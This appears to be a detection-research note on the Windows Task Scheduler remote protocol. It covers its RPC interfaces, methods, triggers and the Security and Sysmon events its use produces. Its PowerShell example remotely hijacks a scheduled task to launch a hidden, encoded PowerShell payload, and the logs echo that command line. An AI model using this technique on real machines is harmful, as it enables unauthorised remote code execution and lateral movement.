# Task Scheduler Service

The Task Scheduler service allows you to perform automated tasks on a chosen computer. With this service, you can schedule any program to run at a convenient time for you or when a specific event occurs.

## Task Scheduler Service Remote Protocol

## ITaskSchedulerService RPC Server
The ITaskSchedulerService interface uses the **ncacn_ip_tcp** RPC protocol sequence and RPC dynamic endpoints.

### RPC Server
* **Name**: ITaskSchedulerService
* **UUID**: 86d35949-83c9-4044-b424-db363231fd0c
* **FilePath**: C:\Windows\System32\schedsvc.dll

```
InterfaceId           : 86d35949-83c9-4044-b424-db363231fd0c
InterfaceVersion      : 1.0
TransferSyntaxId      : 8a885d04-1ceb-11c9-9fe8-08002b104860
TransferSyntaxVersion : 2.0
ProcedureCount        : 20
Procedures            : {SchRpcHighestVersion, SchRpcRegisterTask, SchRpcRetrieveTask, SchRpcCreateFolder...}
Server                : UUID: 86d35949-83c9-4044-b424-db363231fd0c
ComplexTypes          : {Struct_0, Struct_1, Struct_3}
FilePath              : C:\Windows\System32\schedsvc.dll
Name                  : schedsvc.dll
Offset                : 510656
ServiceName           : Schedule
ServiceDisplayName    : Task Scheduler
IsServiceRunning      : True
Endpoints             : {[86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncalrpc:[LRPC-4803de23b17986468a], [86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncalrpc:[ubpmtaskhostchannel], 
                        [86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncalrpc:[LRPC-83a142d94b8e74a91a]}
EndpointCount         : 3
Client                : False 
```

### RPC Clients
* taskcomp.dll
* taskschd.dll
* wmicmiplugin.dll 

### RPC Methods

* SchRpcRegisterTask (Opnum 1)- The SchRpcRegisterTask method registers a task with the server (i.e. Updates).
* SchRpcRetrieveTask (Opnum 2) - The SchRpcRetrieveTask method returns a task definition.
* SchRpcRun (Opnum 12) - The SchRpcRun method runs a task specified by a path.

## ATSvc RPC Server
When using the ATSvc interface, the Task Scheduler Remoting Protocol client and server MUST specify **ncacn_np** as the RPC protocol sequence.
The ATSvc interface uses a well-known endpoint **\PIPE\atsvc**.

### RPC Server
* **Name**: ATSvc
* **UUID**: 1ff70682-0a51-30e8-076d-740be8cee98b
* **FilePath**: C:\Windows\System32\taskcomp.dll

```
InterfaceId           : 1ff70682-0a51-30e8-076d-740be8cee98b
InterfaceVersion      : 1.0
TransferSyntaxId      : 8a885d04-1ceb-11c9-9fe8-08002b104860
TransferSyntaxVersion : 2.0
ProcedureCount        : 4
Procedures            : {NetrJobAdd, NetrJobDel, NetrJobEnum, NetrJobGetInfo}
Server                : UUID: 1ff70682-0a51-30e8-076d-740be8cee98b
ComplexTypes          : {Struct_0, Struct_1, Struct_2}
FilePath              : C:\Windows\System32\taskcomp.dll
Name                  : taskcomp.dll
Offset                : 322256
ServiceName           : 
ServiceDisplayName    : 
IsServiceRunning      : False
Endpoints             : {[1ff70682-0a51-30e8-076d-740be8cee98b, 1.0] ncalrpc:[LRPC-b858137bbb082a0e8d]}
EndpointCount         : 1
Client                : False
```

### RPC Clients
* mstask.dll
* schedcli.dll

### RPC Methods
* NetrJobAdd (Opnum 0)- The NetrJobAdd method MUST add a single AT task to the server's task store.
* NetrJobDel (Opnum 1) - The NetrJobDel method MUST delete a specified range of tasks from the task store. The method is capable of deleting all AT tasks or just a subset of the tasks, as determined by the values of the MinJobId and MaxJobId parameters.
* NetrJobEnum (Opnum 2) - The NetrJobEnum method MUST return an enumeration of all AT tasks on the specified server.
* NetrJobGetInfo (Opnum 3) - The NetrJobGetInfo method MUST return information for a specified ATSvc task. The task identifier MUST be used to locate the task configuration.

## Task Actions
* ComHandler Action - This action fires a COM handler.
* Exec Action -  This action executes a command-line operation such as starting Notepad.
* E-mail Action - This action sends an email when a task is triggered.
* Show Message Action - This action shows a message box with a specified message and title.

## Task Triggers
* TASK_TRIGGER_EVENT - 0 - Starts the task when a specific event occurs.
* TASK_TRIGGER_TIME - 1 - Starts the task at a specific time of day.
* TASK_TRIGGER_DAILY - 2 - Starts the task daily.
* TASK_TRIGGER_WEEKLY - 3 - Starts the task weekly.
* TASK_TRIGGER_MONTHLY - 4 - Starts the task monthly.
* TASK_TRIGGER_MONTHLYDOW - 5 - Starts the task every month on a specific day of the week.
* TASK_TRIGGER_IDLE - 6 - Starts the task when the computer goes into an idle state.
* TASK_TRIGGER_REGISTRATION - 7 - Starts the task when the task is registered.
* TASK_TRIGGER_BOOT - 8 - Starts the task when the computer boots.
* TASK_TRIGGER_LOGON - 9 - Starts the task when a specific user logs on.
* TASK_TRIGGER_SESSION_STATE_CHANGE - 11 - Triggers the task when a specific session state changes.

## Interact with Task Scheduler Remotely

### Powershell - Schedule.Service COM Object 
```Powershell
# connect to Task Scheduler:
$service = New-Object -ComObject Schedule.Service
$service.Connect("WORKSTATION6")

# Get task folder that contains tasks:
$folder = $service.GetFolder('\Microsoft\Windows\')

# Example: Root Task Container:
$folder = $service.GetFolder('\')

# Enumerate Specific Task
$ward0gtask = $folder.GetTask('Ward0g')
$alltasks = $folder.GetTasks(0)

# get task definition and change it (i.e Arguments)
$taskdefinition = $ward0gtask.Definition
$taskdefinition.Actions | ForEach-Object {$_.Path = "powershell"}
$taskdefinition.Actions | ForEach-Object {$_.Arguments = "-noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AY...."}

# write back changed task definition:
# 4 = Update
$folder.RegisterTaskDefinition($task.Name, $taskdefinition, 4, $null, $null, $null)

# Execute Task
$NewTask = $folder.GetTask("Ward0g")
$NewTask.run.Invoke(@(''))

# Stop Task
$NewTask.stop(0)
```

## Security Event Logs

### Security Log
* EventID 4624: Successful Logon

* EventID 4702 (Target): A Scheduled Task Was updated

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"> 
    - <System> 
        <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
        <EventID>4702</EventID> 
        <Version>1</Version> 
        <Level>0</Level> 
        <Task>12804</Task> 
        <Opcode>0</Opcode> 
        <Keywords>0x8020000000000000</Keywords> 
        <TimeCreated SystemTime="2020-12-16T17:12:22.000309100Z" /> 
        <EventRecordID>2292968</EventRecordID> 
        <Correlation ActivityID="{262c1204-cb81-0000-0dbf-29867cced601}" /> 
        <Execution ProcessID="740" ThreadID="1560" /> 
        <Channel>Security</Channel> 
        <Computer>WORKSTATION6.theshire.local</Computer> 
        <Security /> 
    </System> 
    - <EventData> 
        <Data Name="SubjectUserSid">S-1-5-21-3786818125-2382361537-3207726629-1104</Data> 
        <Data Name="SubjectUserName">pgustavo</Data> 
        <Data Name="SubjectDomainName">THESHIRE</Data> 
        <Data Name="SubjectLogonId">0x9ac216f</Data> 
        <Data Name="TaskName">\Ward0g</Data> 
        <Data Name="TaskContentNew"><?xml version="1.0" encoding="UTF-16"?> <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> <RegistrationInfo> <Date>2020-12-16T08:09:21.4521839</Date> <Author>THESHIRE\sbeavers</Author> <Description>Que pasa</Description> <URI>\Ward0g</URI> </RegistrationInfo> <Triggers> <RegistrationTrigger> <Enabled>true</Enabled> </RegistrationTrigger> </Triggers> <Principals> <Principal id="Author"> <UserId>S-1-5-21-3786818125-2382361537-3207726629-1106</UserId> <LogonType>InteractiveToken</LogonType> <RunLevel>LeastPrivilege</RunLevel> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries> <AllowHardTerminate>true</AllowHardTerminate> <StartWhenAvailable>false</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT72H</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context="Author"> <Exec> <Command>powershell</Command> <Arguments>-noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBwAt.....</Data> 
        <Data Name="ClientProcessStartKey">0</Data> 
        <Data Name="ClientProcessId">0</Data> 
        <Data Name="ParentProcessId">0</Data> 
        <Data Name="RpcCallClientLocality">0</Data> 
        <Data Name="FQDN">WORKSTATION6.theshire.local</Data> 
    </EventData> 
</Event>
```

* EventID 4688 (Target): A New Process Has been created

### Microsoft-Windows-TaskScheduler/Operational Logs
* EventID 140: Task Rergistration Updated
* EventID 100: Task Started
* EventID 201: Action Completed
* EventID 201: Task Completed
* EventID 111: Task Terminated
* EventID 332: Launch request ignored. Instance already running

## Sysmon

* EventID 1: ProcessCreate (When Task is stopped)

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"> 
    - <System> 
        <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
        <EventID>1</EventID> 
        <Version>5</Version> 
        <Level>4</Level> 
        <Task>1</Task> 
        <Opcode>0</Opcode> 
        <Keywords>0x8000000000000000</Keywords> 
        <TimeCreated SystemTime="2020-12-16T17:23:48.196270400Z" /> 
        <EventRecordID>9090341</EventRecordID> 
        <Correlation /> 
        <Execution ProcessID="3256" ThreadID="4036" /> 
        <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
        <Computer>WORKSTATION6.theshire.local</Computer> 
        <Security UserID="S-1-5-18" /> 
    </System> 
    - <EventData> 
        <Data Name="RuleName">-</Data> 
        <Data Name="UtcTime">2020-12-16 17:23:48.185</Data> 
        <Data Name="ProcessGuid">{649442b8-42a4-5fda-af62-000000000600}</Data> 
        <Data Name="ProcessId">2836</Data> 
        <Data Name="Image">C:\Windows\System32\taskhostw.exe</Data> 
        <Data Name="FileVersion">10.0.18362.1237 (WinBuild.160101.0800)</Data> 
        <Data Name="Description">Host Process for Windows Tasks</Data> 
        <Data Name="Product">Microsoft® Windows® Operating System</Data> 
        <Data Name="Company">Microsoft Corporation</Data> 
        <Data Name="OriginalFileName">taskhostw.exe</Data> 
        <Data Name="CommandLine">taskhostw.exe C:\windows\System32\WindowsPowerShell\v1.0\powershell.EXE -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AYQBqAE8AcgAgAC0AZwBFACAAMwApAHsAJAA4...</Data> 
        <Data Name="CurrentDirectory">C:\windows\system32\</Data> 
        <Data Name="User">THESHIRE\sbeavers</Data> 
        <Data Name="LogonGuid">{649442b8-783d-5fd2-c316-e00000000000}</Data> 
        <Data Name="LogonId">0xe016c3</Data> 
        <Data Name="TerminalSessionId">2</Data> 
        <Data Name="IntegrityLevel">Medium</Data> 
        <Data Name="Hashes">SHA1=6630F5E1A1ACC1C8E95A7958542DD87D0735D99B,MD5=52071D9553A92A12F22DDDF6DB6F9643,SHA256=ABCA3394728697205DEAD7C9B7B9076CDD28BEE84E7A3C84514478BC033E531A,IMPHASH=9CB27CAED52CB0AFFB32788922A0D083</Data> 
        <Data Name="ParentProcessGuid">{649442b8-52dc-5fd1-3600-000000000600}</Data> 
        <Data Name="ParentProcessId">2220</Data> 
        <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data> 
        <Data Name="ParentCommandLine">C:\windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data> 
    </EventData> 
</Event>
```

* EventID 1: ProcessCreate (Execution when task is forced to execute or task is updated)

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"> 
    - <System> 
        <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
        <EventID>1</EventID> 
        <Version>5</Version> 
        <Level>4</Level> 
        <Task>1</Task> 
        <Opcode>0</Opcode> 
        <Keywords>0x8000000000000000</Keywords> 
        <TimeCreated SystemTime="2020-12-16T17:40:06.014964400Z" /> 
        <EventRecordID>9103725</EventRecordID> 
        <Correlation /> 
        <Execution ProcessID="3256" ThreadID="4036" /> 
        <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
        <Computer>WORKSTATION6.theshire.local</Computer> 
        <Security UserID="S-1-5-18" /> 
        </System> 
    - <EventData> 
        <Data Name="RuleName">-</Data> 
        <Data Name="UtcTime">2020-12-16 17:40:05.997</Data> 
        <Data Name="ProcessGuid">{649442b8-4675-5fda-d962-000000000600}</Data> 
        <Data Name="ProcessId">6840</Data> 
        <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
        <Data Name="FileVersion">10.0.18362.1 (WinBuild.160101.0800)</Data> 
        <Data Name="Description">Windows PowerShell</Data> 
        <Data Name="Product">Microsoft® Windows® Operating System</Data> 
        <Data Name="Company">Microsoft Corporation</Data> 
        <Data Name="OriginalFileName">PowerShell.EXE</Data> 
        <Data Name="CommandLine">C:\windows\System32\WindowsPowerShell\v1.0\powershell.EXE -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AYQBqAE8AcgAgAC0AZwBFACAAMwAp...</Data> 
        <Data Name="CurrentDirectory">C:\windows\system32\</Data> 
        <Data Name="User">THESHIRE\sbeavers</Data> 
        <Data Name="LogonGuid">{649442b8-783d-5fd2-c316-e00000000000}</Data> 
        <Data Name="LogonId">0xe016c3</Data> 
        <Data Name="TerminalSessionId">2</Data> 
        <Data Name="IntegrityLevel">Medium</Data> 
        <Data Name="Hashes">SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481</Data> 
        <Data Name="ParentProcessGuid">{649442b8-52dc-5fd1-3600-000000000600}</Data> 
        <Data Name="ParentProcessId">2220</Data> 
        <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data> 
        <Data Name="ParentCommandLine">C:\windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data> 
    </EventData> 
</Event>
```

EventID 7: Image Loaded
* taskcomp.dll
* taskschd.dll
* wmicmiplugin.dll
* mstask.dll
* schedcli.dll

## References
* https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-TSCH/%5BMS-TSCH%5D-170915-diff.pdf
* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/eb12c947-7e20-4a30-a528-85bc433cec44
* https://docs.microsoft.com/en-us/windows/win32/taskschd/displaying-task-names-and-state--scripting-
* https://docs.microsoft.com/en-us/windows/win32/taskschd/trigger-type
* https://docs.microsoft.com/en-us/windows/win32/taskschd/tasksettings
* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40
* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/4d44c426-fad2-4cc7-9677-bfcd235dca33